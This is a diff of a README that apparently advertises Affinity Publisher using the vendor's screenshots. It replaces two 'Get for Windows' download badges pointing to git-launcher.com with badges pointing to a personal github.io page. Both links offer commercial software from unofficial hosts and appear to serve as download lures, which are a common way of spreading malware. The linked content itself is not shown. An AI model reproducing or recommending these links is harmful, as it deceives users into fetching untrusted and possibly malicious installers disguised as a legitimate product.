@@ -5,11 +5,7 @@
 </div>  
 <br>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://git-launcher.com/)
-
-</div>
+[![GET affinity publisher](https://img.shields.io/badge/GET%20%E2%80%94%20affinity-publisher-0078D6?style=for-the-badge&logoColor=white)](https://lilnuc17278.github.io/.github/affinity-publisher)
 
 ---
 
@@ -26,11 +22,7 @@
   <img src="https://cdn.serif.com/affinity/img/learn/quickstart/publisher/publisher-desktop-welcome-280920231449--lg@2x.png" width="800"/> 
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://git-launcher.com/)
-
-</div>
+[![GET affinity publisher](https://img.shields.io/badge/GET%20%E2%80%94%20affinity-publisher-0078D6?style=for-the-badge&logoColor=white)](https://lilnuc17278.github.io/.github/affinity-publisher)
 
 ---
 
